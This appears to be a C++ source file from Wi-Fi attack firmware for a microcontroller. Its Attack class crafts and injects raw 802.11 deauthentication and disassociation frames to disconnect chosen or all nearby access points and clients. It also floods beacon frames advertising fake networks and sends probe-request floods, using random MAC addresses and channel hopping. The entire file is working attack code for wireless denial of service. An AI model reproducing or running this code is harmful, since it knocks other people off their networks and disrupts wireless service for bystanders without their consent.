#include "Attack.h"
#include "settings.h"

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        beaconPacket[32] = 0xe8; // 1s beacon interval
        beaconPacket[33] = 0x03;
    } else {
        beaconPacket[32] = 0x64; // 100ms beacon interval
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time = currentTime;
}

void Attack::start() {
    stop();
    prntln(A_START);
    attackTime = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll = deauthAll;
    Attack::probe.active = probe;

    Attack::output = output;
    Attack::timeout = timeout;

    if (beacon || probe || deauthAll || deauth) {
        start();
    } else {
        prntln(A_NO_MODE_ERROR);
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::stop() {
    if (running) {
        running = false;
        resetCounters();
        prntln(A_STOP);
    }
}

void Attack::resetCounters() {
    deauthPkts = 0;
    beaconPkts = 0;
    probePkts = 0;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter = 0;
    deauth.maxPkts = 0;
    beacon.maxPkts = 0;
    probe.maxPkts = 0;
    packetRate = 0;
    deauth.tc = 0;
    beacon.tc = 0;
    probe.tc = 0;
}

bool Attack::isRunning() {
    return running;
}

void Attack::updateCounter() {
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    calculateMaxPackets();

    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) {
        setOutputPower(random(21));
    } else {
        setOutputPower(20.5f);
    }

    deauthPkts = deauth.packetCounter;
    beaconPkts = beacon.packetCounter;
    probePkts = probe.packetCounter;
    packetRate = tmpPacketRate;
    resetPacketCounters();
}

void Attack::calculateMaxPackets() {
    if (deauth.active) {
        if (deauthAll) {
            deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                             (accesspoints.count() + stations.count() * 2 - names.selected());
        } else {
            deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                             (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
        }
    } else {
        deauth.maxPkts = 0;
    }

    beacon.maxPkts = beacon.active ? ssids.count() * (settings::getAttackSettings().beacon_interval == INTERVAL_100MS ? 10 : 1) : 0;
    probe.maxPkts = probe.active ? ssids.count() * settings::getAttackSettings().probe_frames_per_ssid : 0;
}

void Attack::resetPacketCounters() {
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter = 0;
    deauth.tc = 0;
    beacon.tc = 0;
    probe.tc = 0;
    tmpPacketRate = 0;
}

void Attack::status() {
    char s[120];
    sprintf(s, str(A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts, probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    return String(OPEN_BRACKET) + buildStatusJSON(deauth) + String(COMMA) +
           buildStatusJSON(beacon) + String(COMMA) + buildStatusJSON(probe) +
           String(packetRate) + CLOSE_BRACKET;
}

String Attack::buildStatusJSON(const AttackType &attackType) {
    return String(OPEN_BRACKET) + b2s(attackType.active) + String(COMMA) +
           String(ssids.count()) + String(COMMA) + String(attackType.packetCounter) +
           String(COMMA) + String(attackType.maxPkts) + String(CLOSE_BRACKET);
}

void Attack::update() {
    if (!running || scan.isScanning()) return;

    apCount = accesspoints.count();
    stCount = stations.count();
    nCount = names.count();

    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();

    if (currentTime - attackTime > 1000) {
        attackTime = currentTime;
        updateCounter();

        if (output) status();
        getRandomMac(mac);
    }
}

void Attack::deauthUpdate() {
    if (deauth.active && !deauthAll && deauth.packetCounter < deauth.maxPkts) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            processDeauth();
        }
    }
}

void Attack::processDeauth() {
    if (apCount > 0 && deauth.tc < apCount) {
        if (accesspoints.getSelected(deauth.tc)) {
            deauth.tc += deauthAP(deauth.tc);
        } else {
            deauth.tc++;
        }
    } else if (stCount > 0 && deauth.tc >= apCount && deauth.tc < stCount + apCount) {
        if (stations.getSelected(deauth.tc - apCount)) {
            deauth.tc += deauthStation(deauth.tc - apCount);
        } else {
            deauth.tc++;
        }
    } else if (nCount > 0 && deauth.tc >= apCount + stCount && deauth.tc < nCount + stCount + apCount) {
        if (names.getSelected(deauth.tc - stCount - apCount)) {
            deauth.tc += deauthName(deauth.tc - stCount - apCount);
        } else {
            deauth.tc++;
        }
    }

    if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
}

void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && deauth.packetCounter < deauth.maxPkts) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            processDeauthAll();
        }
    }
}

void Attack::processDeauthAll() {
    if (apCount > 0 && deauth.tc < apCount) {
        tmpID = names.findID(accesspoints.getMac(deauth.tc));
        if (tmpID < 0 || !names.getSelected(tmpID)) {
            deauth.tc += deauthAP(deauth.tc);
        } else {
            deauth.tc++;
        }
    } else if (stCount > 0 && deauth.tc >= apCount && deauth.tc < stCount + apCount) {
        tmpID = names.findID(stations.getMac(deauth.tc - apCount));
        if (tmpID < 0 || !names.getSelected(tmpID)) {
            deauth.tc += deauthStation(deauth.tc - apCount);
        } else {
            deauth.tc++;
        }
    } else if (nCount > 0 && deauth.tc >= apCount + stCount && deauth.tc < apCount + stCount + nCount) {
        if (!names.getSelected(deauth.tc - apCount - stCount)) {
            deauth.tc += deauthName(deauth.tc - apCount - stCount);
        } else {
            deauth.tc++;
        }
    }

    if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
}

void Attack::probeUpdate() {
    if (probe.active && probe.packetCounter < probe.maxPkts) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && beacon.packetCounter < beacon.maxPkts) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!stMac) return false;  // exit when station mac is null

    // Build deauth packet
    packetSize = sizeof(deauthPacket);
    uint8_t deauthpkt[packetSize];
    memcpy(deauthpkt, deauthPacket, packetSize);
    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;

    // Send deauth frame
    deauthpkt[0] = 0xc0;
    bool success = sendPacket(deauthpkt, packetSize, ch, true);
    if (success) deauth.packetCounter++;

    // Send disassociate frame
    uint8_t disassocpkt[packetSize];
    memcpy(disassocpkt, deauthpkt, packetSize);
    disassocpkt[0] = 0xa0;
    success |= sendPacket(disassocpkt, packetSize, ch, false);
    if (success) deauth.packetCounter++;

    // Send another packet from the station to the AP if not a broadcast
    if (!macBroadcast(stMac)) {
        memcpy(&disassocpkt[4], apMac, 6);
        memcpy(&disassocpkt[10], stMac, 6);
        memcpy(&disassocpkt[16], stMac, 6);

        disassocpkt[0] = 0xc0;
        success |= sendPacket(disassocpkt, packetSize, ch, false);
        if (success) deauth.packetCounter++;

        disassocpkt[0] = 0xa0;
        success |= sendPacket(disassocpkt, packetSize, ch, false);
        if (success) deauth.packetCounter++;
    }

    if (success) deauth.time = currentTime;
    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    packetSize = sizeof(beaconPacket);
    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize -= 26;
    }

    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);
    beaconPacket[82] = ch;

    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
    uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);
    tmpPacket[37] = ssidLen;
    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);

    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);
    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    delete[] tmpPacket; // free memory of allocated buffer
    return success;
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    packetSize = sizeof(probePacket);
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[26], ssid, ssidLen);

    if (sendPacket(probePacket, packetSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    setWifiChannel(ch, force_ch);
    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
    if (sent) ++tmpPacketRate;
    return sent;
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}
